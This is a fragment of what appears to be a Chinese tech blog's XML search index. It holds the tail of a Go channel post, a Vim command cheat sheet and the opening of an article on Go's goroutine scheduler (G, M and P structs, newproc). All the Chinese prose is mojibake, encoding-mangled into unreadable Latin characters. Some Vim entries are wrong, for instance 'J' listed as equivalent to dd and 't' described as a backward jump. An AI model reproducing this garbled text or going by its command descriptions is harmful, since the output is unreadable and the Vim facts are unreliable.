<h2 id="å…³é—­-channel"><a href="#å…³é—­-channel" class="headerlink" title="å…³é—­ channel"></a>å…³é—­ channel</h2><p>close ä¸€ä¸ªå·²è¢«å…³é—­çš„ channel ä¼šå¯¼è‡´ panicã€‚æ­£å¸¸æƒ…å†µä¸‹ï¼Œ<br>runtime ä¼šæ¸…ç©ºæ‰€æœ‰ sudog ä¸Šçš„æ•°æ® elemï¼Œå¹¶æŠŠé˜»å¡åœ¨è¿™ä¸ª channel ä¸Šçš„ goroutine ï¼ˆrevq å’Œ sendq ä¸Šçš„ï¼‰åŠ å…¥è°ƒåº¦é˜Ÿåˆ—è§¦å‘è°ƒåº¦ã€‚</p>
]]></content>
      <categories>
        <category>è¯­è¨€</category>
      </categories>
      <tags>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>Vim ä»å…¥é—¨åˆ°æ”¾å¼ƒ</title>
    <url>/2020/05/22/Vim-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83/</url>
    <content><![CDATA[<p>å¦‚æœé—®ä¸–ç•Œä¸Šæœ€å¼ºå¤§çš„è¯­è¨€æ˜¯ä»€ä¹ˆï¼Ÿç­”æ¡ˆæˆ–è®¸æœ‰å¾ˆå¤šï¼Œä½†æ˜¯å¦‚æœé—®ä¸–ç•Œä¸Šæœ€å¼ºå¤§çš„ç¼–è¾‘å™¨æ˜¯ä»€ä¹ˆï¼Œææ€•å¾ˆå¤šäººéƒ½å›ç­”éƒ½æ˜¯ Vimã€‚ç¬”è€…ä»å…¥é—¨ç¼–ç¨‹çš„ç¬¬ä¸€å¤©å¼€å§‹å°±å¬è¯´äº† Vim çš„å¤§åï¼Œç„¶è€Œè‹¦äºä¸€å¤§å †çœ¼èŠ±ç¼­ä¹±çš„å‘½ä»¤ï¼Œå±¡å±¡å°è¯•æœ€åéƒ½æ˜¯æ— ç–¾è€Œç»ˆã€‚æœ€è¿‘å†³å¿ƒä¸€å®šè¦æŠŠç©æ„å„¿å…¥é—¨äº†ï¼Œäºæ˜¯å¼€å§‹è·Ÿç€å®˜æ–¹ tutorial å­¦ä¹ ã€‚æ‰“å¼€ä¸­æ–‡ç‰ˆå®˜æ–¹ tutorial å‘½ä»¤å¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vimtutor zh</span><br></pre></td></tr></table></figure>

<p>å¤§éƒ¨åˆ† Vim å‘½ä»¤éƒ½å¯ä»¥çœ‹ä½œä¸‰éƒ¨åˆ†ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">operator [number] motion</span><br></pre></td></tr></table></figure>

<p>operator æ˜¯è¦æ‰§è¡Œçš„æ“ä½œï¼ˆåˆ é™¤ã€ä¿®æ”¹ç­‰ï¼‰ï¼Œnumber ä»£è¡¨è¯¥æ“ä½œé‡å¤çš„æ¬¡æ•°ï¼Œmotion æ˜¯ä»¥ä»€ä¹ˆæ ¼å¼ä½œä¸ºæ“ä½œå•ä½ï¼ˆw ä»£è¡¨å•è¯ï¼Œ$ ä»£è¡¨è¡Œæœ«ç­‰ï¼‰</p>
<h2 id="ç§»åŠ¨"><a href="#ç§»åŠ¨" class="headerlink" title="ç§»åŠ¨"></a>ç§»åŠ¨</h2><p>Vim ä½¿ç”¨ hã€jã€kã€l å››ä¸ªé”®æ˜¯å…‰æ ‡åœ¨å·¦ã€ä¸‹ã€ä¸Šã€å³é—´ç§»åŠ¨ï¼ˆå½“ç„¶ï¼Œç›´æ¥ä½¿ç”¨å…‰æ ‡é”®ä¹Ÿå¯ä»¥ï¼‰ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">     ^</span><br><span class="line">     k</span><br><span class="line">&lt;h       l&gt;</span><br><span class="line">     j</span><br><span class="line">     v</span><br></pre></td></tr></table></figure>

<p>å…‰æ ‡åœ¨è¡Œå†…ç§»åŠ¨ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#wï¼šä»å½“å‰ä½ç½®èµ·ç§»åŠ¨åˆ°ä¸‹ # ä¸ªå•è¯çš„å¤´éƒ¨</span><br><span class="line"></span><br><span class="line">#bï¼š#w çš„é€†æ“ä½œ</span><br><span class="line"></span><br><span class="line">#eï¼šä»å½“å‰ä½ç½®å…¶ç§»åŠ¨åˆ°ç¬¬ # ä¸ªå•è¯çš„å°¾éƒ¨</span><br><span class="line"></span><br><span class="line">$ï¼šç§»åŠ¨åˆ°å½“å‰è¡Œå°¾éƒ¨</span><br><span class="line"></span><br><span class="line">0ï¼šç§»åŠ¨åˆ°å½“å‰è¡Œå¤´éƒ¨</span><br><span class="line"></span><br><span class="line">fPatternï¼šæ­£å‘è·³è½¬åˆ° Pattern å­—ç¬¦</span><br><span class="line"></span><br><span class="line">tPatternï¼šåå‘è·³è½¬åˆ° Pattern å­—ç¬¦</span><br><span class="line"></span><br><span class="line">%ï¼šå¦‚æœå½“å‰ä½ç½®æ˜¯ (ã€)ã€[ã€]ã€&#123;ã€&#125;ï¼Œå°†å…‰æ ‡ç§»åŠ¨åˆ°é…å¯¹çš„æ‹¬å·ä¸Š</span><br><span class="line">Gï¼šç§»åŠ¨åˆ°æ–‡ä»¶æœ«å°¾</span><br><span class="line"></span><br><span class="line">ggï¼šç§»åŠ¨åˆ°æ–‡ä»¶å¤´</span><br><span class="line"></span><br><span class="line">#Gï¼šç§»åŠ¨åˆ°æ–‡ä»¶çš„ç¬¬ # è¡Œ</span><br><span class="line"></span><br><span class="line">ctrl+Gï¼šæ˜¾ç¤ºå…‰æ ‡åœ¨æ–‡ä»¶ä¸­çš„ä½ç½®ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">ctrl+oï¼šç§»åŠ¨åˆ°æ—©å‰å…‰æ ‡æ‰€åœ¨ä½ç½®ï¼ˆo è¡¨ç¤º olderï¼‰</span><br><span class="line"></span><br><span class="line">ctrl+iï¼šctrl+o çš„é€†æ“ä½œï¼ˆi åœ¨ o çš„å‰é¢ï¼‰</span><br></pre></td></tr></table></figure>

<p>é™¤äº†ä¸»åŠ¨ç§»åŠ¨å¤–ï¼Œæœ‰æ—¶éœ€è¦åœ¨æ–‡ä»¶ä¸­æ ¹æ®æ¨¡å¼è¿›è¡Œæœç´¢ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/Patternï¼šPattern è¡¨ç¤ºæ¨¡å¼ï¼Œ/ è¡¨ç¤ºå‘ä¸‹æœç´¢</span><br><span class="line"></span><br><span class="line">?Patternï¼š? è¡¨ç¤ºå‘ä¸Šæœç´¢</span><br><span class="line"></span><br><span class="line">æ‰§è¡Œæœç´¢æ“ä½œåï¼Œn è¡¨ç¤ºç»§ç»­æœç´¢ï¼ŒN è¡¨ç¤ºåæ–¹å‘æœç´¢</span><br></pre></td></tr></table></figure>

<h2 id="åˆ é™¤"><a href="#åˆ é™¤" class="headerlink" title="åˆ é™¤"></a>åˆ é™¤</h2><p>å½“ç„¶å¯ä»¥è¿›å…¥ insert æ¨¡å¼åæŒ‰ä¸‹ Backspace è¿›è¡Œåˆ é™¤ï¼Œè¿™é‡Œè®¨è®ºçš„æ˜¯å¦‚ä½•åœ¨ normal æ¨¡å¼ä¸‹åˆ é™¤ï¼š</p>
<p><code>d</code> æ˜¯ä¸€ä¸ª operatorï¼Œè¡¨ç¤ºåˆ é™¤ï¼ˆdeleteï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xï¼š åˆ é™¤å½“å‰å…‰æ ‡æ‰€åœ¨å­—ç¬¦</span><br><span class="line">d#w or d#e or d#$ or d#0ï¼šd è¡¨ç¤ºåˆ é™¤æ“ä½œï¼Œwã€eã€$ã€0 è¡¨ç¤ºä¸åŒæ“ä½œå•ä½ï¼Œ# è¡¨ç¤ºé‡å¤æ¬¡æ•°</span><br><span class="line">ddï¼šåˆ é™¤å½“å‰è¡Œ</span><br><span class="line">#ddï¼šåˆ é™¤ # è¡Œ</span><br><span class="line">dfPaternï¼šä»å½“å‰ä½ç½®åˆ é™¤åˆ° Pattern å­—ç¬¦</span><br><span class="line">di&quot;ï¼šåˆ é™¤åŒå¼•å· &quot;&quot; é‡Œé¢çš„å†…å®¹</span><br><span class="line">da&quot;ï¼šåˆ é™¤åŒå¼•å· &quot;&quot; åŠå…¶é‡Œé¢çš„å†…å®¹</span><br><span class="line">shift+dï¼šç›¸å½“äº d$</span><br><span class="line">shift+sï¼šç›¸å½“äº dd</span><br><span class="line">Jï¼šç›¸å½“äº dd</span><br></pre></td></tr></table></figure>

<p>æœ‰ä¿®æ”¹å°±æœ‰æ’¤é”€ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uï¼šæ’¤é”€ä¸Šæ¬¡ä¸€å‘½ä»¤</span><br><span class="line">Uï¼šæ¢å¤æœ¬è¡Œçš„åŸå§‹çŠ¶æ€ï¼ˆæ’¤é”€ä½œç”¨åœ¨æœ¬è¡Œçš„å‘½ä»¤ï¼‰</span><br><span class="line">ctrl+Rï¼šu çš„é€†æ“ä½œ</span><br></pre></td></tr></table></figure>

<h2 id="å¤åˆ¶-amp-ç²˜è´´"><a href="#å¤åˆ¶-amp-ç²˜è´´" class="headerlink" title="å¤åˆ¶&amp;ç²˜è´´"></a>å¤åˆ¶&amp;ç²˜è´´</h2><p><code>y</code> æ˜¯ä¸€ä¸ª operatorï¼Œè¡¨ç¤ºå¤åˆ¶ï¼ˆcopyï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#yyï¼šå¤åˆ¶ # è¡Œ</span><br><span class="line"></span><br><span class="line">y#w or y#e or y#$ or y#0ï¼šy è¡¨ç¤ºå¤åˆ¶æ“ä½œï¼Œwã€eã€$ã€0 è¡¨ç¤ºä¸åŒæ“ä½œå•ä½ï¼Œ# è¡¨ç¤ºé‡å¤æ¬¡æ•°</span><br><span class="line"></span><br><span class="line">v è¿›å…¥ visual æ¨¡å¼ï¼Œç„¶åç”¨ç§»åŠ¨é”®ï¼ˆhã€jã€kã€lï¼‰è¿›è¡Œé€‰æ‹©</span><br><span class="line">è¢«é€‰ä¸­çš„åŒºåŸŸå¯ä»¥è¿›è¡Œæ‰¹é‡ dã€y æ“ä½œã€‚</span><br></pre></td></tr></table></figure>


<p>åˆ é™¤æ“ä½œåˆ æ‰çš„æ•°æ®ä¼šä¿å­˜åœ¨ vim çš„ç¼“å­˜ä¸­ï¼Œç”¨å¦‚ä¸‹å‘½ä»¤æŠŠä¸Šä¸€æ¬¡åˆ é™¤çš„æ•°æ®å¤åˆ¶åˆ°ç›¸åº”ä½ç½®ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#pï¼šå¤åˆ¶ # æ¬¡ï¼Œå¦‚æœè¢«åˆ é™¤æ•°æ®æ˜¯ä¸€æ•´è¡Œé‚£ä¹ˆåœ¨å…‰æ ‡çš„ä¸‹ä¸€è¡Œæ’å…¥</span><br></pre></td></tr></table></figure>

<h2 id="æ’å…¥-amp-æ›¿æ¢"><a href="#æ’å…¥-amp-æ›¿æ¢" class="headerlink" title="æ’å…¥&amp;æ›¿æ¢"></a>æ’å…¥&amp;æ›¿æ¢</h2><p>åœ¨è¡Œçš„æŒ‡å®šåŒºåŸŸè¿›å…¥ insert æ¨¡å¼ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Aï¼šå…‰æ ‡ç§»åˆ°è¡Œæœ«å¹¶è¿›å…¥ insert æ¨¡å¼</span><br><span class="line"></span><br><span class="line">aï¼šåœ¨å…‰æ ‡åè¾¹è¿›å…¥ insert æ¨¡å¼</span><br></pre></td></tr></table></figure>

<p>åœ¨ normal æ¨¡å¼ä¸‹å¯¹å…‰æ ‡æŒ‡å‘çš„å­—ç¬¦è¿›è¡Œæ›¿æ¢ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rnewï¼šå½“å‰å­—ç¬¦æ›¿æ¢ä¸º new</span><br><span class="line"></span><br><span class="line">Rnewï¼šè¿ç»­æ›¿æ¢å¤šä¸ªå­—ç¬¦ï¼Œç±»ä¼¼äºåŸåœ°ç›´æ¥ä¿®æ”¹</span><br></pre></td></tr></table></figure>

<p>å¦‚æœå•ä¸ªå­—ç¬¦ä¿®æ”¹ä¸å¤Ÿç”¨ï¼Œå¯ä»¥ä¸€æ¬¡ä¿®æ”¹æ›´å¤šã€‚<code>c</code> æ˜¯ä¸€ä¸ª operatorï¼Œè¡¨ç¤ºä¿®æ”¹ï¼ˆchangeï¼‰ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c#w or c#e or c#$ or c#0ï¼šæ”¹å˜ä»å½“å‰ä½ç½®åˆ°æŒ‡å®šä½ç½®çš„æ‰€æœ‰æ–‡æœ¬ï¼Œä¼šè‡ªåŠ¨è¿›å…¥ insert æ¨¡å¼</span><br></pre></td></tr></table></figure>

<p>å¯¹æ–‡æœ¬ä¸­ç¬¦åˆæ¨¡å¼çš„å­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:s/old/new&lt;å›è½¦&gt; æ›¿æ¢å½“å‰è¡Œç¬¬ä¸€ä¸ªåŒ¹é…é¡¹ </span><br><span class="line"></span><br><span class="line">:s/old/new/g æ›¿æ¢å½“å‰è¡Œæ‰€æœ‰åŒ¹é…é¡¹ </span><br><span class="line"></span><br><span class="line">:#,#s/old/new/g æ›¿æ¢ # åˆ° # è¡Œæ‰€æœ‰çš„åŒ¹é…é¡¹</span><br><span class="line"></span><br><span class="line">:%s/old/new/g æ›¿æ¢æ–‡æœ¬ä¸­æ¯ä¸ªåŒ¹é…é¡¹</span><br><span class="line"></span><br><span class="line">:%s/old/new/gc æ–‡æœ¬ä¸­æ¯ä¸ªåŒ¹é…é¡¹éƒ½æç¤ºæ˜¯å¦è¿›è¡Œæ›¿æ¢</span><br></pre></td></tr></table></figure>

<p>æ’å…¥ç©ºè¡Œå¹¶è¿›å…¥ insert æ¨¡å¼ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">oï¼šåœ¨ä¸‹ä¸€è¡Œæ’å…¥ç©ºè¡Œ</span><br><span class="line"></span><br><span class="line">Oï¼šåœ¨ä¸Šä¸€è¡Œæ’å…¥ç©ºè¡Œ</span><br></pre></td></tr></table></figure>

<h2 id="ä¿å­˜æ“ä½œ"><a href="#ä¿å­˜æ“ä½œ" class="headerlink" title="ä¿å­˜æ“ä½œ"></a>ä¿å­˜æ“ä½œ</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:!commandï¼šæ‰§è¡Œ commandï¼Œå³ä½¿æœ‰å‘½ä»¤è¡Œå‚æ•°ä¹Ÿå¯ä»¥è¿™ä¹ˆæ“ä½œ</span><br><span class="line"></span><br><span class="line">:w FILENAME æŠŠæ–‡ä»¶å¦å­˜ä¸º FILEMNAME</span><br><span class="line"></span><br><span class="line">v è¿›å…¥ visual æ¨¡å¼ï¼Œé€‰æ‹©ç›¸åº”æ–‡æœ¬åç”¨ :w FILENAME æŠŠé€‰æ‹©çš„æ–‡æœ¬å¦å­˜ä¸º FILENAME</span><br><span class="line"></span><br><span class="line">:r FILENAME æŠŠæ–‡ä»¶ FILENAME å†…å®¹æ’å…¥åˆ°å…‰æ ‡ä¹‹å</span><br><span class="line"></span><br><span class="line">:r !command æŠŠ command çš„è¾“å‡ºæ’å…¥åˆ°å…‰æ ‡ä¹‹å</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>å¼€å‘å·¥å…·</category>
      </categories>
      <tags>
        <tag>Vim</tag>
      </tags>
  </entry>
  <entry>
    <title>Goåº•å±‚å¤§å†’é™©ä¹‹è°ƒåº¦å™¨</title>
    <url>/2020/04/27/%E8%B0%83%E5%BA%A6%E5%99%A8%E2%80%94Go%E8%AF%AD%E8%A8%80%E7%9A%84%E5%A4%A7%E7%AE%A1%E5%AE%B6/</url>
    <content><![CDATA[<p>è™½ç„¶çº¿ç¨‹æ¯”è¾ƒè½»é‡ï¼Œä½†æ˜¯åœ¨è°ƒåº¦æ—¶ä¹Ÿæœ‰æ¯”è¾ƒå¤§çš„é¢å¤–å¼€é”€ã€‚æ¯ä¸ªçº¿ç¨‹ä¼šéƒ½å ç”¨ 1M ä»¥ä¸Šçš„å†…å­˜ç©ºé—´ï¼Œåœ¨å¯¹çº¿ç¨‹è¿›è¡Œåˆ‡æ¢æ—¶ä¸æ­¢ä¼šæ¶ˆè€—è¾ƒå¤šçš„å†…å­˜ï¼Œæ¢å¤å¯„å­˜å™¨ä¸­çš„å†…å®¹è¿˜éœ€è¦å‘æ“ä½œç³»ç»Ÿç”³è¯·æˆ–è€…é”€æ¯å¯¹åº”çš„èµ„æºï¼Œæ¯ä¸€æ¬¡çº¿ç¨‹ä¸Šä¸‹æ–‡çš„åˆ‡æ¢éƒ½éœ€è¦æ¶ˆè€— 1us å·¦å³çš„æ—¶é—´ã€‚è€Œ Go è°ƒåº¦å™¨å¯¹ Goroutine çš„ä¸Šä¸‹æ–‡åˆ‡æ¢çº¦ä¸º 0.2usï¼Œå‡å°‘äº† 80% çš„é¢å¤–å¼€é”€</p>
<p>Go è¯­è¨€çš„è°ƒåº¦å™¨é€šè¿‡ä½¿ç”¨ä¸ CPU æ•°é‡ç›¸ç­‰çš„çº¿ç¨‹å‡å°‘çº¿ç¨‹é¢‘ç¹åˆ‡æ¢çš„å†…å­˜å¼€é”€ï¼ŒåŒæ—¶åœ¨æ¯ä¸€ä¸ªçº¿ç¨‹ä¸Šæ‰§è¡Œé¢å¤–å¼€é”€æ›´ä½çš„ Goroutine æ¥é™ä½æ“ä½œç³»ç»Ÿå’Œç¡¬ä»¶çš„è´Ÿè½½ã€‚</p>
<h2 id="æ•°æ®ç»“æ„"><a href="#æ•°æ®ç»“æ„" class="headerlink" title="æ•°æ®ç»“æ„"></a>æ•°æ®ç»“æ„</h2><p>è°ƒåº¦å™¨çš„ä¸‰ä¸ªç»„æˆéƒ¨åˆ†ï¼šG(Goroutine)ï¼ŒP(å¤„ç†å™¨)ï¼ŒM(çº¿ç¨‹)</p>
<ul>
<li>Gï¼šä»£è¡¨ Goroutineï¼Œæ˜¯ä¸€ä¸ªå¾…æ‰§è¡Œçš„ä»»åŠ¡</li>
<li>Pï¼šä»£è¡¨å¤„ç†å™¨ï¼Œç›¸å½“äºä¸€ä¸ªä¸çº¿ç¨‹ç»‘å®šçš„å°å‹è°ƒåº¦å™¨</li>
<li>Mï¼šä»£è¡¨æ“ä½œç³»ç»Ÿçº¿ç¨‹</li>
</ul>
<p><img src="https://i.loli.net/2020/04/26/F617HYhRtfTrJlM.png" alt="GMPæ¨¡å‹"></p>
<h3 id="G"><a href="#G" class="headerlink" title="G"></a>G</h3><p>Gorotuine å°±æ˜¯ Go è¯­è¨€è°ƒåº¦å™¨ä¸­å¾…æ‰§è¡Œçš„ä»»åŠ¡ï¼Œå®ƒåœ¨è¿è¡Œæ—¶è°ƒåº¦å™¨ä¸­çš„åœ°ä½ä¸çº¿ç¨‹åœ¨æ“ä½œç³»ç»Ÿä¸­å·®ä¸å¤šï¼Œä½†æ˜¯å®ƒå ç”¨äº†æ›´å°çš„å†…å­˜ç©ºé—´ï¼Œä¹Ÿé™ä½äº†ä¸Šä¸‹æ–‡åˆ‡æ¢çš„å¼€é”€ã€‚</p>
<p>Goroutine åªå­˜åœ¨äº Go è¯­è¨€çš„è¿è¡Œæ—¶ï¼Œå®ƒæ˜¯ Go è¯­è¨€åœ¨ç”¨æˆ·æ€æä¾›çš„çº¿ç¨‹ï¼Œä½œä¸ºä¸€ç§ç²’åº¦æ›´ç»†çš„èµ„æºè°ƒåº¦å•å…ƒï¼Œå¦‚æœä½¿ç”¨å¾—å½“èƒ½å¤Ÿåœ¨é«˜å¹¶å‘çš„åœºæ™¯ä¸‹æ›´é«˜æ•ˆåœ°åˆ©ç”¨æœºå™¨çš„ CPUã€‚</p>
<p>Goroutine è¡¨ç°ä¸ºç§æœ‰ç»“æ„ä½“ gï¼Œä¸‹é¢æ˜¯ä¸€äº›æ¯”è¾ƒé‡è¦çš„å­—æ®µï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> g <span class="keyword">struct</span> &#123;</span><br><span class="line">    stack stack <span class="comment">// æ ˆå†…å­˜èŒƒå›´</span></span><br><span class="line">    preempt <span class="keyword">bool</span> <span class="comment">// æŠ¢å ä¿¡å·</span></span><br><span class="line">    _panic *_panic <span class="comment">// å­˜å‚¨ panic ç»“æ„ä½“çš„é“¾è¡¨</span></span><br><span class="line">    _defer *_defer <span class="comment">// å­˜å‚¨ defer ç»“æ„ä½“çš„é“¾è¡¨</span></span><br><span class="line">    m *m <span class="comment">// å½“å‰å ç”¨çº¿ç¨‹</span></span><br><span class="line">    sched gobuf <span class="comment">// ä¸ Goroutine è°ƒåº¦ç›¸å…³çš„æ•°æ®</span></span><br><span class="line">    atomicstatus <span class="keyword">uint32</span> <span class="comment">// Goroutine çš„çŠ¶æ€</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>sched</code> å­—æ®µå¯¹ Goroutine çš„è°ƒåº¦è‡³å…³é‡è¦ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> gobuf <span class="keyword">struct</span> &#123;</span><br><span class="line">    sp <span class="keyword">uintptr</span> <span class="comment">// æ ˆæŒ‡é’ˆ</span></span><br><span class="line">    pc <span class="keyword">uintptr</span> <span class="comment">// ç¨‹åºè®¡æ•°å™¨</span></span><br><span class="line">    g guintptr <span class="comment">// æŒæœ‰è¿™ä¸ª gobuf çš„ Goroutine</span></span><br><span class="line">    ret sys.Uintreg <span class="comment">// ç³»ç»Ÿè°ƒç”¨çš„è¿”å›å€¼</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Goroutine çš„çŠ¶æ€å¯åˆ†ä¸ºä¸‰ç±»ï¼šç­‰å¾…ä¸­ã€å¯è¿è¡Œã€è¿è¡Œä¸­</p>
<ul>
<li>ç­‰å¾…ä¸­ï¼šGoroutine æ­£åœ¨ç­‰å¾…æŸäº›æ¡ä»¶æ»¡è¶³ï¼Œä¾‹å¦‚ï¼šç³»ç»Ÿè°ƒç”¨ç»“æŸç­‰ï¼ŒåŒ…æ‹¬ <code>_Gwaiting</code>ã€<code>_Gsyscall</code> å’Œ <code>_Gpreempted</code> å‡ ä¸ªçŠ¶æ€</li>
<li>è¿è¡Œæ—¶ï¼šGoroutine å·²ç»å‡†å¤‡å°±ç»ªï¼Œå¯ä»¥åœ¨çº¿ç¨‹è¿è¡Œï¼Œå¦‚æœå½“å‰ç¨‹åºä¸­æœ‰éå¸¸å¤šçš„ Goroutineï¼Œæ¯ä¸ª Goroutine å°±å¯èƒ½ä¼šç­‰å¾…æ›´å¤šçš„æ—¶é—´ï¼Œå³ <code>_Grunnable</code></li>
<li>è¿è¡Œä¸­ï¼šGoroutine æ­£åœ¨æŸä¸ªçº¿ç¨‹ä¸Šè¿è¡Œï¼Œå³ <code>_Grunning</code></li>
</ul>
<!-- ![GoroutineçŠ¶æ€](https://i.loli.net/2020/04/26/HYZyCRmugW4XA8K.png) -->

<h3 id="M"><a href="#M" class="headerlink" title="M"></a>M</h3><p>M æ˜¯æ“ä½œç³»ç»Ÿçº¿ç¨‹ã€‚è°ƒåº¦å™¨æœ€å¤šå¯ä»¥åˆ›å»º 10000 ä¸ªçº¿ç¨‹ï¼Œä½†æ˜¯å…¶ä¸­å¤§å¤šæ•°çš„çº¿ç¨‹éƒ½ä¸ä¼šæ‰§è¡Œç”¨æˆ·ä»£ç ï¼ˆå¯èƒ½é™·å…¥ç³»ç»Ÿè°ƒç”¨ï¼‰ï¼Œæœ€å¤šåªä¼šæœ‰ GOMAXPROCS ä¸ªæ´»è·ƒçº¿ç¨‹èƒ½å¤Ÿæ­£å¸¸è¿è¡Œã€‚åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿è¡Œæ—¶ä¼šå°† GOMAXPROCS è®¾ç½®æˆå½“å‰æœºå™¨çš„æ ¸æ•°ï¼Œè¿™æ ·ä¸ä¼šè§¦å‘æ“ä½œç³»ç»Ÿçš„çº¿ç¨‹è°ƒåº¦å’Œä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œæ‰€æœ‰çš„è°ƒåº¦éƒ½ä¼šå‘ç”Ÿåœ¨ç”¨æˆ·æ€ï¼Œç”± Go è¯­è¨€è°ƒåº¦å™¨è§¦å‘ï¼Œèƒ½å¤Ÿå‡å°‘éå¸¸å¤šçš„é¢å¤–å¼€é”€ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ runtime.GOMAXPROCS æ¥æ”¹å˜ç¨‹åºä¸­æœ€å¤§çš„çº¿ç¨‹æ•°ã€‚</p>
<p><img src="https://i.loli.net/2020/04/26/ihSrwOGqjRa3mCo.png" alt="Mä¸CPU"></p>
<p>çº¿ç¨‹è¡¨ç°ä¸ºç§æœ‰ç»“æ„ä½“ mï¼Œä¸‹é¢æ˜¯ä¸€äº›æ¯”è¾ƒé‡è¦çš„å­—æ®µï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> m <span class="keyword">struct</span> &#123;</span><br><span class="line">    g0 *g <span class="comment">// æŒæœ‰è°ƒåº¦æ ˆçš„ goroutineï¼Œæ·±åº¦å‚ä¸ goroutine çš„åˆ›å»ºè¿‡ç¨‹</span></span><br><span class="line">    curg *g <span class="comment">// å½“å‰çº¿ç¨‹æŒæœ‰çš„ goroutine</span></span><br><span class="line">    p puintptr <span class="comment">// æ­£åœ¨è¿è¡Œçš„è°ƒåº¦å™¨</span></span><br><span class="line">    nextp puintptr <span class="comment">// å¤‡ç”¨è°ƒåº¦å™¨</span></span><br><span class="line">    oldp puintptr <span class="comment">// ä¹‹å‰ä½¿ç”¨çš„è°ƒåº¦å™¨</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="P"><a href="#P" class="headerlink" title="P"></a>P</h3><p>é€šè¿‡å¤„ç†å™¨ P çš„è°ƒåº¦ï¼Œæ¯ä¸€ä¸ªå†…æ ¸çº¿ç¨‹éƒ½èƒ½å¤Ÿæ‰§è¡Œå¤šä¸ª Goroutineï¼Œå®ƒèƒ½åœ¨ Goroutine è¿›è¡Œä¸€äº› I/O æ“ä½œæ—¶åŠæ—¶åˆ‡æ¢ï¼Œæé«˜çº¿ç¨‹çš„åˆ©ç”¨ç‡ã€‚</p>
<p>è°ƒåº¦å™¨åœ¨å¯åŠ¨æ—¶å°±ä¼šåˆ›å»º GOMAXPROCS ä¸ªå¤„ç†å™¨ï¼Œå³å¤„ç†å™¨æ•°é‡ä¸€å®šä¼šç­‰äº GOMAXPROCSï¼Œè¿™äº›å¤„ç†å™¨ä¼šç»‘å®šåˆ°ä¸åŒçš„å†…æ ¸çº¿ç¨‹ä¸Šå¹¶åˆ©ç”¨çº¿ç¨‹çš„è®¡ç®—èµ„æºè¿è¡Œ Goroutineã€‚</p>
<p>å¤„ç†å™¨è¡¨ç°ä¸ºç§æœ‰ç»“æ„ä½“ pï¼Œä¸‹é¢æ˜¯ä¸€äº›æ¯”è¾ƒé‡è¦çš„å­—æ®µï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> p <span class="keyword">struct</span> &#123;</span><br><span class="line">    status <span class="keyword">uint32</span> <span class="comment">// å¤„ç†å™¨çŠ¶æ€</span></span><br><span class="line">    m muintptr <span class="comment">// å½“å‰ç»‘å®šçš„çº¿ç¨‹</span></span><br><span class="line">    runqhead <span class="keyword">uint32</span> <span class="comment">// ç­‰å¾…é˜Ÿåˆ—é˜Ÿå¤´</span></span><br><span class="line">    runqtail <span class="keyword">uint32</span> <span class="comment">// ç­‰å¾…é˜Ÿåˆ—é˜Ÿå°¾</span></span><br><span class="line">    runq [<span class="number">256</span>]guintptr <span class="comment">// ç­‰å¾…é˜Ÿåˆ—</span></span><br><span class="line">    runnext guintptr <span class="comment">// ä¸‹ä¸€ä¸ªéœ€è¦æ‰§è¡Œçš„ goroutine</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/04/26/TaxLscAnwlDZq7m.png" alt="GMPä¸‰è€…å…³ç³»"></p>
<h2 id="åˆ›å»º-Goroutine"><a href="#åˆ›å»º-Goroutine" class="headerlink" title="åˆ›å»º Goroutine"></a>åˆ›å»º Goroutine</h2><p><code>go</code> å…³é”®å­—ä¼šè¢«è½¬æ¢ä¸º <code>runtime.newproc</code>ï¼Œè¯¥å‡½æ•°ä¼šæ¥æ”¶å¤§å°å’Œè¡¨ç¤ºå‡½æ•°çš„æŒ‡é’ˆ:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newproc</span><span class="params">(siz <span class="keyword">int32</span>, fn *funcval)</span></span> &#123;</span><br><span class="line">    argp := add(unsafe.Pointer(&amp;fn), sys.PtrSize)</span><br><span class="line">    gp := getg()</span><br><span class="line">    pc := getcallerpc()</span><br><span class="line">    newproc1(fn, (*<span class="keyword">uint8</span>)(argp), siz, gp, pc)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

